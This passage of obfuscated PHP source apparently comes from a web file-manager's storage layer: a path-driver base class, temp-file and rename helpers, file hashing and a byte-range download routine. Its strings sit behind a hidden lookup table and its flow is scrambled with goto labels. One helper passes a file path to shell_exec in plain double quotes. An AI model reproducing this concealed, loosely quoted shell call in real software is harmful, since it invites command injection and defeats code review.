$a©‹Í´é =& $_SERVER[İåâé¾]; $eèàÀÓƒÑÃ = $this->query($a©‹Í´é[42] . $a©‹Í´é[43] . $a©‹Í´é[44]); $eÙöˆ¦ÈÀÓ = array(); foreach ($eèàÀÓƒÑÃ as $FİÂî… óç => $Bàåç¨¹¥) { $eÙöˆ¦ÈÀÓ[$FİÂî… óç] = current($Bàåç¨¹¥); } return $eÙöˆ¦ÈÀÓ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $a‹½•‚°¾ô =& $_SERVER[İåâé¾]; $this->error = $this->_linkID->lastErrorMsg(); if ($a‹½•‚°¾ô[33] != $this->queryStr) { $this->error .= LNG($a‹½•‚°¾ô[45]) . $this->queryStr; } think_trace($this->error, $a‹½•‚°¾ô[33], $a‹½•‚°¾ô[46]); return $this->error; } public function escapeString($cÈ‰Â¤’Ã•) { $B×àô‘â¥Ä =& $_SERVER[İåâé¾]; if ($this->_linkID) { return $this->_linkID->escapeString($cÈ‰Â¤’Ã•); } return str_ireplace($B×àô‘â¥Ä[55], $B×àô‘â¥Ä[56], $cÈ‰Â¤’Ã•); } public function parseLimit($a½ëğ×Ü¨Ë) { $e³œ™èĞÄ´ =& $_SERVER[İåâé¾]; $fìË÷òè‹ö = $e³œ™èĞÄ´[33]; if (!empty($a½ëğ×Ü¨Ë)) { $a½ëğ×Ü¨Ë = explode($e³œ™èĞÄ´[47], $a½ëğ×Ü¨Ë); if (count($a½ëğ×Ü¨Ë) > 1) { $fìË÷òè‹ö .= $e³œ™èĞÄ´[48] . $a½ëğ×Ü¨Ë[1] . $e³œ™èĞÄ´[49] . $a½ëğ×Ü¨Ë[0] . $e³œ™èĞÄ´[50]; } else { $fìË÷òè‹ö .= $e³œ™èĞÄ´[48] . $a½ëğ×Ü¨Ë[0] . $e³œ™èĞÄ´[50]; } } return $fìË÷òè‹ö; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $EİÓĞÂ²¦ğ =& $_SERVER[İåâé¾]; $this->objectDriver = array($EİÓĞÂ²¦ğ[57], $EİÓĞÂ²¦ğ[58], $EİÓĞÂ²¦ğ[59], $EİÓĞÂ²¦ğ[60], $EİÓĞÂ²¦ğ[61], $EİÓĞÂ²¦ğ[62], $EİÓĞÂ²¦ğ[63], $EİÓĞÂ²¦ğ[64], $EİÓĞÂ²¦ğ[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($bÑÛ°ƒ ¯¼) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($bÑÛ°ƒ ¯¼, $_SERVER[İåâé¾][8]); } return $bÑÛ°ƒ ¯¼; } public function getPathName($e‘²‹‡ƒÌñ) { return $e‘²‹‡ƒÌñ; } public function iconvApp($CÊ¾Ë®è±á) { return $CÊ¾Ë®è±á; } public function iconvSystem($a¤­×ÆÅí¾) { return $a¤­×ÆÅí¾; } public function iconvTo($dˆÈºƒÒÁÏ, $CïøÌŠå™ù, $FùÆŠØôÒ) { goto D´â”©Ìâõ; bò¯¾¹¡¤Õ: return $eËÒÄÑ¿£; goto AŸëº»êÃÊ; Fî¤ÑĞ•ó”: $bÜ‚ÚğÉé[$FùÆŠØôÒ . $dç¦ÕÈ­òÍ[67] . $CïøÌŠå™ù . $dç¦ÕÈ­òÍ[68] . $dˆÈºƒÒÁÏ] = $dˆÈºƒÒÁÏ; $bÜ‚ÚğÉé[$FùÆŠØôÒ . $dç¦ÕÈ­òÍ[67] . $CïøÌŠå™ù . $dç¦ÕÈ­òÍ[68] . $eËÒÄÑ¿£] = $dˆÈºƒÒÁÏ; $bÜ‚ÚğÉé[$CïøÌŠå™ù . $dç¦ÕÈ­òÍ[67] . $FùÆŠØôÒ . $dç¦ÕÈ­òÍ[68] . $eËÒÄÑ¿£] = $eËÒÄÑ¿£; goto bò¯¾¹¡¤Õ; dö‚¶ËÚ¦: $eËÒÄÑ¿£ = $eËÒÄÑ¿£ ? $eËÒÄÑ¿£ : $dˆÈºƒÒÁÏ; if (strstr($eËÒÄÑ¿£, $dç¦ÕÈ­òÍ[70])) { $eËÒÄÑ¿£ = str_replace($dç¦ÕÈ­òÍ[70], $dç¦ÕÈ­òÍ[71], $eËÒÄÑ¿£); } $bÜ‚ÚğÉé[$CïøÌŠå™ù . $dç¦ÕÈ­òÍ[67] . $FùÆŠØôÒ . $dç¦ÕÈ­òÍ[68] . $dˆÈºƒÒÁÏ] = $eËÒÄÑ¿£; goto Fî¤ÑĞ•ó”; D´â”©Ìâõ: $dç¦ÕÈ­òÍ =& $_SERVER[İåâé¾]; if (!$dˆÈºƒÒÁÏ || !function_exists($dç¦ÕÈ­òÍ[66])) { return $dˆÈºƒÒÁÏ; } static $bÜ‚ÚğÉé = array(); goto C¨„‚×ª¬; C¨„‚×ª¬: $bİ‚å÷Ü¥ = $CïøÌŠå™ù . $dç¦ÕÈ­òÍ[67] . $FùÆŠØôÒ . $dç¦ÕÈ­òÍ[68] . $dˆÈºƒÒÁÏ; if (isset($bÜ‚ÚğÉé[$bİ‚å÷Ü¥])) { return $bÜ‚ÚğÉé[$bİ‚å÷Ü¥]; } if (function_exists($dç¦ÕÈ­òÍ[69])) { $eËÒÄÑ¿£ = @mb_convert_encoding($dˆÈºƒÒÁÏ, $FùÆŠØôÒ, $CïøÌŠå™ù); } else { $eËÒÄÑ¿£ = @iconv($CïøÌŠå™ù, $FùÆŠØôÒ, $dˆÈºƒÒÁÏ); } goto dö‚¶ËÚ¦; AŸëº»êÃÊ: } public function getPathInner($bŠÃÑ¶‡˜µ) { $aøÙÕŠš‹Ô = IO::init($bŠÃÑ¶‡˜µ); return $aøÙÕŠš‹Ô->path; } public function getPathOuter($f”é±í™‹Á) { $AøİŞø·Ìø =& $_SERVER[İåâé¾]; $EÇÅÓ­åÇ± = strlen(trim($this->pathBase, $AøİŞø·Ìø[8])); $f”é±í™‹Á = substr(trim($f”é±í™‹Á, $AøİŞø·Ìø[8]), $EÇÅÓ­åÇ±); return $this->pathDriver . $AøİŞø·Ìø[8] . ltrim($f”é±í™‹Á, $AøİŞø·Ìø[8]); } public function isParentOf($EÙ“ƒæ®ôô, $Dâ¬ÆÄÓ•“) { $DñÁ–ò†  =& $_SERVER[İåâé¾]; $EÙ“ƒæ®ôô = rtrim(strtolower($EÙ“ƒæ®ôô), $DñÁ–ò† [8]) . $DñÁ–ò† [8]; $Dâ¬ÆÄÓ•“ = rtrim(strtolower($Dâ¬ÆÄÓ•“), $DñÁ–ò† [8]) . $DñÁ–ò† [8]; $AÓ´î§°ø = strpos($Dâ¬ÆÄÓ•“, $EÙ“ƒæ®ôô) === 0; return $AÓ´î§°ø; } public function getType() { $A»Ò¶Šøç· =& $_SERVER[İåâé¾]; $bæå±Šè‹ = str_replace($A»Ò¶Šøç·[72], $A»Ò¶Šøç·[33], get_class($this)); return strtolower($bæå±Šè‹); } public function isTypeObject() { return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($a‰æ¤¿», $B‚¸Õ¶¬Ë) { $Bã³ ©º’‘ =& $_SERVER[İåâé¾]; $EÊ÷´“»½ = rtrim($a‰æ¤¿», $Bã³ ©º’‘[8]) . $Bã³ ©º’‘[8] . $B‚¸Õ¶¬Ë; $eó§Ñ¥õÊˆ = $this->exist($EÊ÷´“»½); return $eó§Ñ¥õÊˆ ? $EÊ÷´“»½ : !1; } public function renameObject($A‹öÅÈò, $AñŠÚ¯¶¶š) { $b„ÜïöÚÆ¨ =& $_SERVER[İåâé¾]; Hook::trigger($b„ÜïöÚÆ¨[73], $this, $A‹öÅÈò, $this, $this->pathFather($A‹öÅÈò) . $AñŠÚ¯¶¶š); $A‹öÅÈò = $this->getPathOuter($A‹öÅÈò); $AñŠÚ¯¶¶š = $this->pathFather($A‹öÅÈò) . $AñŠÚ¯¶¶š; if (IO::isFile($A‹öÅÈò)) { $CˆŞïŒœ›´ = IO::move($A‹öÅÈò, $AñŠÚ¯¶¶š, REPEAT_RENAME_FOLDER); } else { $CˆŞïŒœ›´ = IO::mkdir($AñŠÚ¯¶¶š); if (!$CˆŞïŒœ›´) { return !1; } $f˜İÜİÙƒ´ = IO::listPath($A‹öÅÈò); $Bˆ¯æÀÑ› = array_merge($f˜İÜİÙƒ´[$b„ÜïöÚÆ¨[74]], $f˜İÜİÙƒ´[$b„ÜïöÚÆ¨[75]]); foreach ($Bˆ¯æÀÑ› as $b£ÛÕó®«) { IO::move($b£ÛÕó®«[$b„ÜïöÚÆ¨[76]], $AñŠÚ¯¶¶š, REPEAT_RENAME_FOLDER); } IO::remove($A‹öÅÈò); } return $CˆŞïŒœ›´ ? $AñŠÚ¯¶¶š : !1; } public function isType($e²ç© É´‚, $b†Ï ¯¨©¶) { return strtolower($b†Ï ¯¨©¶) == $this->getType(); } public function tempFile($eå³½Õ½²‰ = '', $AŒäâÅÜ¾ = '') { goto Eñ‘öîêğª; E£õ¼âÒ«™: $d»‹–âÏ‹“ = $E—‘¹Öª» . $eå³½Õ½²‰; @touch($d»‹–âÏ‹“); if ($AŒäâÅÜ¾) { file_put_contents($d»‹–âÏ‹“, $AŒäâÅÜ¾); } goto Ağ¢²‡¿›á; Ağ¢²‡¿›á: return $d»‹–âÏ‹“; goto DÔªÔ‹„º­; Eñ‘öîêğª: if (!$eå³½Õ½²‰) { $eå³½Õ½²‰ = rand_string(15); } $E—‘¹Öª» = TEMP_FILES . rand_string(15) . $_SERVER[İåâé¾][8]; @mkdir($E—‘¹Öª», 511, !0); goto E£õ¼âÒ«™; DÔªÔ‹„º­: } public function tempFileRemve($B²¦Â¿…¦) { @unlink($B²¦Â¿…¦); @rmdir($this->pathFather($B²¦Â¿…¦)); } public function mkfile($aÊ¨åàœ’È, $aİÊ±É¹‹ = '', $e ß¢öî³ğ = REPEAT_RENAME) { } public function mkdir($aìíòé»Ô, $f»’ø…Çå’ = REPEAT_SKIP) { } public function copyFile($c‚¿¤¢¯ØÒ, $A…¶¶…Ş»õ) { } public function moveFile($D»í°å–», $C’½ÁË÷¦Š) { } public function remove($Aè‹ƒ«ô•) { if ($this->isFile($Aè‹ƒ«ô•)) { return $this->delFile($Aè‹ƒ«ô•); } return $this->delFolder($Aè‹ƒ«ô•); } public function rename($EƒïÓ, $b‹’òÔ»ê) { } public function exist($AªÇòíĞ»µ) { } public function findByHash($AÇŠˆËªÀ¡ = '', $F›¯î“İù½ = '') { return !1; } public function isFile($CºÑµæÕÀ) { } public function isFolder($f¢¤‰Å¥ìÕ) { } public function size($cïº•Ãùù) { } public function info($f³°ò—Ìé¨) { } public function infoAuth($aÌ‡ãŠîĞ) { return $this->info($aÌ‡ãŠîĞ); } public function infoFull($AŸÏ™¼Ñæß) { return $this->info($AŸÏ™¼Ñæß); } public function infoWithChildren($Bê´³ÎæÀ¹) { $f¤”™ÎÓ¬› =& $_SERVER[İåâé¾]; $AØÊ±‘Ÿ„Ñ = $this->info($Bê´³ÎæÀ¹); if ($AØÊ±‘Ÿ„Ñ && $AØÊ±‘Ÿ„Ñ[$f¤”™ÎÓ¬›[29]] == $f¤”™ÎÓ¬›[77]) { $F‰…Ê¯«ëÔ = array($f¤”™ÎÓ¬›[78] => 0, $f¤”™ÎÓ¬›[79] => 0, $f¤”™ÎÓ¬›[80] => 0); $this->infoChildren($Bê´³ÎæÀ¹, $F‰…Ê¯«ëÔ); $AØÊ±‘Ÿ„Ñ[$f¤”™ÎÓ¬›[78]] = $F‰…Ê¯«ëÔ[$f¤”™ÎÓ¬›[78]]; $AØÊ±‘Ÿ„Ñ[$f¤”™ÎÓ¬›[81]] = array($f¤”™ÎÓ¬›[82] => $F‰…Ê¯«ëÔ[$f¤”™ÎÓ¬›[79]], $f¤”™ÎÓ¬›[83] => $F‰…Ê¯«ëÔ[$f¤”™ÎÓ¬›[80]]); } return $AØÊ±‘Ÿ„Ñ; } public function listPath($BŒµ¤¢¯Ş¿, $F“ßá…¶¸ = false, $Aàõ»„ÌŞ = false) { } public function has($c†ñ·ƒ©õì, $aÓÙ¦°óÙ = false) { } public function canRead($D¾ª˜Ç÷Ğò) { } public function canWrite($a¨÷Â¢½Ê) { } public function getContent($E‚…œ—Ú‚) { } public function setContent($DîêœØ¸, $CŠ½³È…Æ˜ = '') { } protected function infoChildren($dğ‡í­ø, &$fš«È“¼Ü) { $a¸ï´º½ğ‚ =& $_SERVER[İåâé¾]; $b¥£ëÍÑ¨ë = $this->listPath($dğ‡í­ø, !1, !0); $b¥£ëÍÑ¨ë = array_merge($b¥£ëÍÑ¨ë[$a¸ï´º½ğ‚[75]], $b¥£ëÍÑ¨ë[$a¸ï´º½ğ‚[74]]); foreach ($b¥£ëÍÑ¨ë as $E®¢İÔ¤Û¯) { if ($E®¢İÔ¤Û¯[$a¸ï´º½ğ‚[29]] == $a¸ï´º½ğ‚[77]) { $fš«È“¼Ü[$a¸ï´º½ğ‚[80]]++; $Bø¡ó‡Ç = $this->getPathInner($E®¢İÔ¤Û¯[$a¸ï´º½ğ‚[76]]); $this->infoChildren($Bø¡ó‡Ç, $fš«È“¼Ü); } else { $fš«È“¼Ü[$a¸ï´º½ğ‚[79]]++; $fš«È“¼Ü[$a¸ï´º½ğ‚[78]] += $E®¢İÔ¤Û¯[$a¸ï´º½ğ‚[78]]; } } } public function fileSubstr($AÛå¿ ¢½é, $DÄñ›Ì ½…, $E®î¢ŠªÄ®) { } public function listAll($aİôÜæ¹) { } public function upload($BæÕÀ– º¡, $C˜í®ŠÈÒÇ, $f÷˜ÔŠÎõ = false, $B—±ÌšÑŒÉ = REPEAT_REPLACE) { } public function uploadFileByID($EåìÉôÒ‹¾, $E†Ÿ¶ƒøË, $a¤ßæÎÍå‹) { } public function uploadFileByPath($cªİÒäŞ³, $fÓĞŸö¿””, $B‚»é Ò¥Ñ = array()) { } public function uploadLink($a†´‡ÁÔè½, $a»±Óí¹»ö = 0) { goto céÚõÄìâµ; dÔâ‰ÃÛ©: $c†™ÍÒ‹… = $a»±Óí¹»ö <= $eîÔ©ˆ®ŸØ ? $FÁ´«ˆ‰„[86] : $FÁ´«ˆ‰„[87]; if ($BÑ©¬‹Ã == $FÁ´«ˆ‰„[61]) { $c†™ÍÒ‹… = $FÁ´«ˆ‰„[87]; } if ($BÑ©¬‹Ã == $FÁ´«ˆ‰„[65] && $a»±Óí¹»ö >= 1024 * 1024 * 10) { $c†™ÍÒ‹… = $FÁ´«ˆ‰„[87]; } goto Eƒ™¢ÒÑ…½; bŸ ëÍö¹¢: if (!in_array($BÑ©¬‹Ã, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $eîÔ©ˆ®ŸØ = 1024 * 1024 * 20; goto dÔâ‰ÃÛ©; céÚõÄìâµ: $FÁ´«ˆ‰„ =& $_SERVER[İåâé¾]; if ($GLOBALS[$FÁ´«ˆ‰„[6]][$FÁ´«ˆ‰„[84]][$FÁ´«ˆ‰„[85]]) { return; } $BÑ©¬‹Ã = $this->getType(); goto bŸ ëÍö¹¢; Eƒ™¢ÒÑ…½: $Fî§ŞÍ‚Ã = (!$a»±Óí¹»ö ? 1 : ceil($a»±Óí¹»ö / pow(1024, 3))) * 3600 * 4; $E®¢²æá·Ö = $this->{$c†™ÍÒ‹…}($a†´‡ÁÔè½, $Fî§ŞÍ‚Ã); if ($E®¢²æá·Ö) { $E®¢²æá·Ö[$FÁ´«ˆ‰„[88]] = $a†´‡ÁÔè½; $E®¢²æá·Ö[$FÁ´«ˆ‰„[89]] = $BÑ©¬‹Ã; } goto Dµ´Üùç§; Dµ´Üùç§: return $E®¢²æá·Ö; goto D½®ø¹ùö³; D½®ø¹ùö³: } public function uploadFormData($d’Ü›œ°¤, $a†É†®¸É = 3600) { } public function multiUploadFormData($a¬ìóà‡·, $f¦Â‰£ó‰Æ = 3600) { } public function download($f®ŠÉÑ›Á°, $C°Õš–à•) { } public function ext($eˆªÆÛ¢Ùò) { $F–·Ü½Š…Ş =& $_SERVER[İåâé¾]; if (strpos($eˆªÆÛ¢Ùò, $F–·Ü½Š…Ş[8]) === -1) { $DÎù¸‘¹Ë = $eˆªÆÛ¢Ùò; } else { $DÎù¸‘¹Ë = $this->pathThis($eˆªÆÛ¢Ùò); } $cìÃ¦î¨Îô = $F–·Ü½Š…Ş[33]; if (strstr($DÎù¸‘¹Ë, $F–·Ü½Š…Ş[90])) { $cìÃ¦î¨Îô = substr($DÎù¸‘¹Ë, strrpos($DÎù¸‘¹Ë, $F–·Ü½Š…Ş[90]) + 1); $cìÃ¦î¨Îô = strtolower($cìÃ¦î¨Îô); } if (strlen($cìÃ¦î¨Îô) > 3 && preg_match($F–·Ü½Š…Ş[91], $cìÃ¦î¨Îô, $b¤·‘¤æÉ)) { $cìÃ¦î¨Îô = $F–·Ü½Š…Ş[33]; } return $cìÃ¦î¨Îô; } public function pathThis($D´êšíºÅà) { $aíß‘²˜ =& $_SERVER[İåâé¾]; $D´êšíºÅà = str_replace($aíß‘²˜[92], $aíß‘²˜[8], rtrim($D´êšíºÅà, $aíß‘²˜[8])); $aíÙ‡˜ß™Õ = strrpos($D´êšíºÅà, $aíß‘²˜[8]); if ($aíÙ‡˜ß™Õ === !1) { return $D´êšíºÅà; } return substr($D´êšíºÅà, $aíÙ‡˜ß™Õ + 1); } public function pathFather($a†‚Æ‘ÆÍÒ) { $cÙñìÏõÁ =& $_SERVER[İåâé¾]; $a†‚Æ‘ÆÍÒ = str_replace($cÙñìÏõÁ[92], $cÙñìÏõÁ[8], rtrim($a†‚Æ‘ÆÍÒ, $cÙñìÏõÁ[8])); $F°‹Ÿª¿å = strrpos($a†‚Æ‘ÆÍÒ, $cÙñìÏõÁ[8]); if ($F°‹Ÿª¿å === !1) { return $cÙñìÏõÁ[33]; } return substr($a†‚Æ‘ÆÍÒ, 0, $F°‹Ÿª¿å + 1); } public function hashSimple($F„›Ÿ†) { goto Aä±ê…¢Ë‘; aõ±÷„è»î: $B„ÊàÃÄÁİ = 200; $fÙˆò”¯­— = 50; if ($A–ÎöÌº´ <= $B„ÊàÃÄÁİ * $fÙˆò”¯­—) { return $this->hashMd5($F„›Ÿ†) . $A–ÎöÌº´; } goto c±ãêØ£–Ø; Aä±ê…¢Ë‘: $Aƒ˜Â­Â =& $_SERVER[İåâé¾]; if (!$F„›Ÿ†) { return md5($Aƒ˜Â­Â[33]); } $A–ÎöÌº´ = $this->size($F„›Ÿ†); goto aõ±÷„è»î; Aá¨”‘Öõ·: $Fòõğ¤Ñ®à .= $this->fileSubstr($F„›Ÿ†, $A–ÎöÌº´ - $B„ÊàÃÄÁİ, $B„ÊàÃÄÁİ); return md5($Fòõğ¤Ñ®à) . $A–ÎöÌº´; goto c½ƒá°ÄÉé; c±ãêØ£–Ø: $DˆéÂ‰ïòŠ = intval($A–ÎöÌº´ / $fÙˆò”¯­—); $Fòõğ¤Ñ®à = $Aƒ˜Â­Â[33]; for ($B£ø—ÇÈòÆ = 0; $B£ø—ÇÈòÆ < $fÙˆò”¯­—; $B£ø—ÇÈòÆ++) { $Fòõğ¤Ñ®à .= $this->fileSubstr($F„›Ÿ†, $DˆéÂ‰ïòŠ * $B£ø—ÇÈòÆ, $B„ÊàÃÄÁİ); } goto Aá¨”‘Öõ·; c½ƒá°ÄÉé: } public static $md5Cache = array(); public function hashMd5($cäÂÀà•‹) { $cäÂÀà•‹ = $this->iconvSystem($cäÂÀà•‹); if (isset(self::$md5Cache[$cäÂÀà•‹])) { return self::$md5Cache[$cäÂÀà•‹]; } self::$md5Cache[$cäÂÀà•‹] = $this->hashMd5Shell($cäÂÀà•‹); if (!self::$md5Cache[$cäÂÀà•‹]) { self::$md5Cache[$cäÂÀà•‹] = @md5_file($cäÂÀà•‹); } return self::$md5Cache[$cäÂÀà•‹]; } private function hashMd5Shell($càŒ®íÊˆÙ) { goto C©ù¢³—ÃÎ; D²…êÄ‘è‚: $BÑ¦ëô®º¸ = Cache::get($bÁ‚ÀŒ©[96]); if (!$BÑ¦ëô®º¸) { $BÔ¢ŒÏ®îÍ = BASIC_PATH . $bÁ‚ÀŒ©[97]; $e¡“øé×Ğ = md5_file($BÔ¢ŒÏ®îÍ); $BÑ¦ëô®º¸ = $bÁ‚ÀŒ©[98]; foreach ($c‹Ñíä«‰ó as $e­¯†·‰Á¿) { $aŒí—£¿ÕŒ = shell_exec($e­¯†·‰Á¿ . "\x20\x22{$BÔ¢ŒÏ®îÍ}\42"); if ($aŒí—£¿ÕŒ && substr(trim($aŒí—£¿ÕŒ), 0, 32) == $e¡“øé×Ğ) { $BÑ¦ëô®º¸ = $e­¯†·‰Á¿; break; } } Cache::set($bÁ‚ÀŒ©[96], $BÑ¦ëô®º¸, 3600); } if ($BÑ¦ëô®º¸ == $bÁ‚ÀŒ©[98]) { return !1; } goto BÖ¯î¸¢±Ö; BÖ¯î¸¢±Ö: $aŒí—£¿ÕŒ = shell_exec($BÑ¦ëô®º¸ . "\x20\x22{$càŒ®íÊˆÙ}\x22"); return substr($aŒí—£¿ÕŒ, 0, 32); goto fËÁ•Ç“Æ; C©ù¢³—ÃÎ: $bÁ‚ÀŒ© =& $_SERVER[İåâé¾]; if (!function_exists($bÁ‚ÀŒ©[93])) { return !1; } $c‹Ñíä«‰ó = array($bÁ‚ÀŒ©[94], $bÁ‚ÀŒ©[95]); goto D²…êÄ‘è‚; fËÁ•Ç“Æ: } public function link($CĞÓ¥æğ®Ö) { return $CĞÓ¥æğ®Ö; } public function fileOut($f»½²ÈÔ½Å, $dÑ‡÷ôµ¹ = false, $FëÆ¸Í¾§ƒ = false, $AÂ¶ğ²”¤ = '') { goto A²ğÇ“ô©ğ; a»´Ù¾’¯: if (isset($_SERVER[$CÆ“¥ª¨éä[128]]) && $_SERVER[$CÆ“¥ª¨éä[128]] == $AÂ¶ğ²”¤) { header($CÆ“¥ª¨éä[129] . $AÂ¶ğ²”¤, !0, 304); die; } header($CÆ“¥ª¨éä[129] . $AÂ¶ğ²”¤); header($CÆ“¥ª¨éä[130] . $cµ±¾†Ç‚” . $CÆ“¥ª¨éä[122]); goto Eƒç¯áŠ; c½™Ä²¿£ï: header($CÆ“¥ª¨éä[124]); header($CÆ“¥ª¨éä[125]); if (isset($_SERVER[$CÆ“¥ª¨éä[126]]) && strtotime($_SERVER[$CÆ“¥ª¨éä[126]]) == $EÅ‰Ş­ó›¯[$CÆ“¥ª¨éä[105]]) { header($CÆ“¥ª¨éä[127], !0, 304); die; } goto a»´Ù¾’¯; cå»ÎÇÏÊµ: $Eˆ¼ùÚÆ‹ = $GLOBALS[$CÆ“¥ª¨éä[6]][$CÆ“¥ª¨éä[84]][$CÆ“¥ª¨éä[101]][$CÆ“¥ª¨éä[102]]; $e…÷ƒöé…î = intval($GLOBALS[$CÆ“¥ª¨éä[6]][$CÆ“¥ª¨éä[84]][$CÆ“¥ª¨éä[101]][$CÆ“¥ª¨éä[103]] * 1024 * 1024); @ob_end_clean(); goto E¦ÔÁº‹Šˆ; eÀ›’¦šƒ: while ($e™»Ä§µ <= $Då¤“Œ¿¦) { $EäáîÂäº‘ = timeFloat(); check_abort(); $Eãà‹‘ç“è = $Då¤“Œ¿¦ - $e™»Ä§µ + 1; if ($Eãà‹‘ç“è <= $cŒ±å‹À•¢) { $cŒ±å‹À•¢ = $Eãà‹‘ç“è; } echo $this->fileSubstr($f»½²ÈÔ½Å, $e™»Ä§µ, $cŒ±å‹À•¢); $e™»Ä§µ += $cŒ±å‹À•¢; if ($cŒ±å‹À•¢ == $Eãà‹‘ç“è) { $e™»Ä§µ = $Då¤“Œ¿¦ + 1; } if ($B…Ó»ÀÜ´”) { $A¼îâàÁÉÎ = intval(1000 * 1000 * (timeFloat() - $EäáîÂäº‘)); $bãïÖƒËª = $B…Ó»ÀÜ´” - $A¼îâàÁÉÎ; if ($bãïÖƒËª > 5) { usleep($bãïÖƒËª); } } } goto eƒó·‘äÀ¦; aˆšæãÓçã: header($CÆ“¥ª¨éä[120] . $b»áíº—èÄ); header($CÆ“¥ª¨éä[121] . gmdate($CÆ“¥ª¨éä[104], time() + 3600 * 24 * 30) . $CÆ“¥ª¨éä[122]); header($CÆ“¥ª¨éä[123]); goto c½™Ä²¿£ï; a¼†Ìš†Ó: $cŒ±å‹À•¢ = 1024 * 100; $B…Ó»ÀÜ´” = 0; if ($e…÷ƒöé…î) { $B…Ó»ÀÜ´” = intval(1000 * 1000 * ($cŒ±å‹À•¢ / $e…÷ƒöé…î)); } goto eÀ›’¦šƒ; CéÙÙ„¹Ôå: header($CÆ“¥ª¨éä[134]); $Eµ‰ö¤ÙËó = strtolower($_SERVER[$CÆ“¥ª¨éä[135]]); if ($f¦½“˜¯ && $Eµ‰ö¤ÙËó && $Eˆ¼ùÚÆ‹) { if (strstr($Eµ‰ö¤ÙËó, $CÆ“¥ª¨éä[136])) { header($CÆ“¥ª¨éä[137] . $f»½²ÈÔ½Å); } else { if (strstr($Eµ‰ö¤ÙËó, $CÆ“¥ª¨éä[138])) { header($CÆ“¥ª¨éä[139] . $f»½²ÈÔ½Å); } else { if (strstr($Eµ‰ö¤ÙËó, $CÆ“¥ª¨éä[140])) { header($CÆ“¥ª¨éä[141] . $f»½²ÈÔ½Å); } } } if ($e…÷ƒöé…î) { header($CÆ“¥ª¨éä[142] . $e…÷ƒöé…î); } return; } goto cÕ„Ş†Ñ¯À; A¾ÓÊÍŒŒ: if (!$AÂ¶ğ²”¤) { $AÂ¶ğ²”¤ = md5($cµ±¾†Ç‚” . $this->hashSimple($f»½²ÈÔ½Å)); } $AÂ¶ğ²”¤ = $CÆ“¥ª¨éä[111] . $AÂ¶ğ²”¤ . $CÆ“¥ª¨éä[111]; $b»áíº—èÄ = get_file_mime($C¾µšÛ¾); goto E§»¯‡ªÉ; fë¾ÇÓ‘³Ÿ: $Då¤“Œ¿¦ = $aÊ”â¶…„¿ - 1; $C¾µšÛ¾ = $this->ext($dá˜¸­ùƒ); if (in_array($C¾µšÛ¾, array($CÆ“¥ª¨éä[106], $CÆ“¥ª¨éä[107], $CÆ“¥ª¨éä[108], $CÆ“¥ª¨éä[109]))) { $C¾µšÛ¾ = $CÆ“¥ª¨éä[110]; } goto A¾ÓÊÍŒŒ; A²ğÇ“ô©ğ: $CÆ“¥ª¨éä =& $_SERVER[İåâé¾]; if (!$f»½²ÈÔ½Å || !$this->exist($f»½²ÈÔ½Å)) { show_json(LNG($CÆ“¥ª¨éä[99]), !1, $FëÆ¸Í¾§ƒ); } $f¦½“˜¯ = $this->getType() == $CÆ“¥ª¨éä[100]; goto cå»ÎÇÏÊµ; Eƒç¯áŠ: header($CÆ“¥ª¨éä[131] . $dá˜¸­ùƒ); header($CÆ“¥ª¨éä[132]); header($CÆ“¥ª¨éä[133] . $aÊ”â¶…„¿); goto CéÙÙ„¹Ôå; Aö£‡•¨åƒ: $b±ÈÒ‹ÄõÉ = $CÆ“¥ª¨éä[111] . $b±ÈÒ‹ÄõÉ . $CÆ“¥ª¨éä[115] . $b±ÈÒ‹ÄõÉ; if ($dÑ‡÷ôµ¹) { header($CÆ“¥ª¨éä[116]); header($CÆ“¥ª¨éä[117] . $b±ÈÒ‹ÄõÉ); } else { header($CÆ“¥ª¨éä[118] . $b±ÈÒ‹ÄõÉ); } header($CÆ“¥ª¨éä[119]); goto aˆšæãÓçã; BÇÓÏŠÉ: $cµ±¾†Ç‚” = gmdate($CÆ“¥ª¨éä[104], $EÅ‰Ş­ó›¯[$CÆ“¥ª¨éä[105]]); $dá˜¸­ùƒ = $FëÆ¸Í¾§ƒ ? $FëÆ¸Í¾§ƒ : $this->iconvApp($EÅ‰Ş­ó›¯[$CÆ“¥ª¨éä[28]]); $e™»Ä§µ = 0; goto fë¾ÇÓ‘³Ÿ; E§»¯‡ªÉ: if (strstr($b»áíº—èÄ, $CÆ“¥ª¨éä[112])) { $b»áíº—èÄ = $b»áíº—èÄ . $CÆ“¥ª¨éä[113]; } if ($dÑ‡÷ôµ¹ === !1 && !mime_support($b»áíº—èÄ)) { $dÑ‡÷ôµ¹ = !0; $b»áíº—èÄ = $CÆ“¥ª¨éä[114]; } $b±ÈÒ‹ÄõÉ = rawurlencode($dá˜¸­ùƒ); goto Aö£‡•¨åƒ; E¦ÔÁº‹Šˆ: set_timeout(); $EÅ‰Ş­ó›¯ = $this->infoFull($f»½²ÈÔ½Å); $aÊ”â¶…„¿ = $EÅ‰Ş­ó›¯[$CÆ“¥ª¨éä[78]]; goto BÇÓÏŠÉ; cÕ„Ş†Ñ¯À: if (isset($_SERVER[$CÆ“¥ª¨éä[143]])) { if (preg_match($CÆ“¥ª¨éä[144], $_SERVER[$CÆ“¥ª¨éä[143]], $Dä‡³ß™……)) { $e™»Ä§µ = intval($Dä‡³ß™……[1]); if (!empty($Dä‡³ß™……[2])) { $Då¤“Œ¿¦ = intval($Dä‡³ß™……[2]); } } header($CÆ“¥ª¨éä[145]); header("\103\157\156\x74\x65\156\x74\55\122\x61\x6e\147\x65\x3a\40\142\171\164\x65\163\x20{$e™»Ä§µ}\x2d{$Då¤“Œ¿¦}\x2f" . $aÊ”â¶…„¿); } else { header($CÆ“¥ª¨éä[146]); } header($CÆ“¥ª¨éä[147] . ($Då¤“Œ¿¦ - $e™»Ä§µ + 1)); if ($_SERVER[$CÆ“¥ª¨éä[148]] == $CÆ“¥ª¨éä[149]) { return; } goto a¼†Ìš†Ó; eƒó·‘äÀ¦: } public function fileOutServer($DØÅ—õ¿½, $Eƒ¬åµ•ìŠ = false, $D„—ïÅÏ¥ = false, $eø‹£ã± = '') { self::fileOut($DØÅ—õ¿½, $Eƒ¬åµ•ìŠ, $D„—ïÅÏ¥, $eø‹£ã±); } public function fileOutLink($e–ìĞîÜ²Ÿ) { 